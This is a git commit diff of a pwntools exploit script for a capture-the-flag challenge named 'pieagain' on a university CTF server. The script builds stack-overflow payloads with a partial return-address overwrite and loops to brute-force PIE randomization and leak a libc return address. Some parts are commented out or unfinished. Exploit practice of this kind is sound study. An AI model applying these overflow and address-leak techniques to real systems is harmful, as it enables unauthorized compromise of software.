e796c3b7e086298709017590fb257f637b616ed9
Ji <stujyh@126.com>
2020-12-23 16:51:06 +0800

    analyzing

--- ctfzone-lv8-pieagain/exp.py
+++ ctfzone-lv8-pieagain/exp.py
@@ -1,14 +1,59 @@
 from pwn import *
+from random import choice
 
-io = remote("pwn1.0ops.sjtu.cn", 10008)
+
+
+def penetrate(io, base, elf):
+    rep = 0x2c
+    io.sendline('jyh')
+    print(io.recvline())
+    print(io.recvline())
+    write = elf.plt['write']
+    payload = b'A'*rep + b'\xDE' + bytes([base*16 + 8])
+    print(payload)
+    io.sendline(payload)
+    print(io.recvline())
+    ...
+
+
 elf = ELF('./pieagain')
 
-print(io.recvline())
+# io = remote("pwn1.0ops.sjtu.cn", 10008)
 
-io.send(b"A"*0x1f)
+# print(io.recvline())
 
-print(io.recvline())
-ret = b'\x94'
-io.send(b'A'*0x2c + b'\x00'*4 + ret)
+# io.send(b"A"*31)
 
-print(io.recvline())
+rep = 0x2c
+
+# print(io.recvline())
+
+# payload = b'A'*rep + b'\xDE\x08' 
+
+# io.sendline(payload)
+
+# print(io.recvline())
+
+
+# print(io.recvall())
+# exit(1)
+while True:
+    io = remote("pwn1.0ops.sjtu.cn", 10008)
+    io.recvline()
+    io.send(b"A"*31)
+    io.recvline()
+    print(io.recvline())
+    b = choice([i for i in range(16)])
+    payload = b'A'*rep + b'\xDE\x08' # + bytes([b*16 + 8]) # 0x{b}863 is the start address of rtn
+    io.sendline(payload)
+    try:
+        io.recv(4)
+        addr = io.recv(4)
+        print(hex(u32(addr))) # return address of main function, which is in _libc_start_main function
+        break
+    except:
+        continue
+
+# penetrate(io, b, elf) 
+
+# io.interactive()
